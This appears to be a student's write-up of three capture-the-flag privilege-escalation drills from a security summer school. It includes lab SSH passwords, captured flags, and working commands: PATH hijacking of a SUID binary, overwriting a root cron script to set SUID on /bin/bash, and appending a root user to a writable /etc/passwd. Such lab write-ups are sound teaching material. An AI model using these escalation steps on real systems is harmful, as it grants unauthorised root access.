# Lab 09 - Privilege Escalation

| Drill Name | Port | Username | Password |
| :--- | :--- | :--- | :--- |
| **Maverick** | **2022** | `maverick` | `jXztBtEWKYRMrjAF` |
| **Time** | **2023** | `time` | `EDBVCjNFAAzYedCX` |
| **Writable** | **2024** | `jack` | `YvFWPeC7sTWJdaYQ` |

# Maverick
```bash
ssh maverick@sss.upb -p 2022
jXztBtEWKYRMrjAF
```

Lets look for files with SUID
```bash
maverick@maverick:~$ find / -perm -4000 2> /dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/home/maverick/scripts/favorite-quote
```

favorite-quote looks interesting so we copy it to take a better look at it with ghidra
```bash
scp -P 2022 maverick@sss.upb:~/scripts/favorite-quote .
```

We see that it sets the uid and gid to 0, prints some text, and calls whoami, but without an abosulte path

![hidra](../../../public/images/security_summer_school/09_privilege_escalation/maverick_ghidra.png)

We can exploit this with PATH hijacking and making it run our own version of whoami

1. Create a custom whoami script in /tmp that spawns a root shell
```bash
echo '#!/bin/bash' > /tmp/whoami
echo '/bin/bash -p' >> /tmp/whoami   
chmod +x /tmp/whoami
```

2. Prepend /tmp to PATH so our script is found first
```bash
export PATH=/tmp:$PATH
```

3. Run the SUID binary
```bash
/home/maverick/scripts/favorite-quote
```

Test it worked
```bash
root@maverick:~/scripts# id
uid=0(root) gid=0(root) groups=0(root),1000(maverick)
```

Now we can read the flag
```bash
root@maverick:~/scripts# cd /root
root@maverick:/root# ls
flag.txt
root@maverick:/root# cat flag.txt
SSS{t00_m4ny_f4c3b00k_qu0t3s}
```

# Time
```bash
ssh time@sss.upb -p 2023
EDBVCjNFAAzYedCX
```

We take a look at the crontab
```bash
time@time:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/bin/python /home/wormhole/time-travel.py
```

And see that time-travel.py is running periodically, good to know

Lets see what we can run with sudo
```bash
time@time:/home$ sudo -l
[sudo] password for time:
Matching Defaults entries for time on time:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User time may run the following commands on time:
    (wormhole) /usr/bin/multitime
```

Now we inspect it with ghidra
```bash
scp -P 2023 time@sss.upb:/usr/bin/multitime .
```
```bash
time@time:/home$ /usr/bin/multitime
Missing command.
Usage:
  multitime [-f <liketime|rusage>] [-I <replstr>] [-i <stdincmd>]
    [-n <numruns> [-o <stdoutcmd>] [-q] [-s <sleep>] <command>
    [<arg 1> ... <arg n>]
  multitime -b <file> [-f <rusage>] [-q] [-s <sleep>] [-n <numruns>]
```

We can see it is first running a command
```bash
time@time:/home$ /usr/bin/multitime whoami
time
real         0.00
user         0.00
sys          0.00
```

Lets run it as the wormhole user
```bash
sudo -u wormhole /usr/bin/multitime <command> [arguments...]
```
```bash
time@time:/home$ sudo -u wormhole /usr/bin/multitime id
uid=1001(wormhole) gid=1001(wormhole) groups=1001(wormhole)
===> multitime results
1: id
            Mean        Std.Dev.    Min         Median      Max
real        0.001       0.000       0.001       0.001       0.001
user        0.000       0.000       0.000       0.000       0.000
sys         0.001       0.000       0.001       0.001       0.001
```

We can get a shell as wormhole now
```bash
sudo -u wormhole /usr/bin/multitime /bin/bash -i
```

And view the contents of time-travel.py
```python
from datetime import datetime

def back_in_time():
    print("I've built this time machine to get back in time!\n")
    now = datetime.now()

    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print("Current date is...")
    print('.');
    print('.');
    print('.');
    print(dt_string)

    if dt_string:
        print("Fvck... Maybe there is something broke here...")

if __name__ == "__main__":
    back_in_time()
```

Lets replace them with something that gives /bin/bash SUID so we can spawn a shell as root after the cron job runs
```bash
echo "import os; os.system(\"chmod u+s /bin/bash\")" > /home/wormhole/time-travel.py
```

After waiting a few minutes we can become root
```bash
/bin/bash -p
```
```bash
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
flag.txt
bash-5.0# cat flag.txt
flag = SSS{y0u_4r3_k1ll1ng_t1m3}
```

NOTE: We could have just used this command to solve it faster
```bash
sudo -u wormhole /usr/bin/multitime /bin/bash -c 'echo "import os; os.system(\"chmod u+s /bin/bash\")" > /home/wormhole/time-travel.py'
```

# Writable
```bash
ssh -p 2024 jack@sss.upb 
YvFWPeC7sTWJdaYQ
```

The name of the challenge suggests we can write in an important file, after inspecting the machine we find out that the file is /etc/passwd
```bash
jack@writable:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1320 Jul 24  2022 /etc/passwd
```

Lets generate the SHA-512 hash for our password
```bash
openssl passwd -6 -salt mysalt pass
```

Add a new entry
```bash
echo 'theo:$6$mysalt$xDOF4tdccs7ch7ng0lnbKQoqVd1ht2x0P3KQzWSZafhldlI65JsFSmlAAj9La8dikYU0LNkS1.gOL.54UCqPt/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Now we can switch to that user
```bash
jack@writable:~$ su theo
Password:
root@writable:/home/ubuntu# cd /root
root@writable:~# ls
flag.txt
root@writable:~# cat flag.txt
SSS{th1s_w4s_s0_wr1t4bl3}
```

> [!NOTE]
> Had some issues with the inital connection, had to use
> 
> ssh -oKexAlgorithms=curve25519-sha256 -p 2024 jack@141.85.224.102
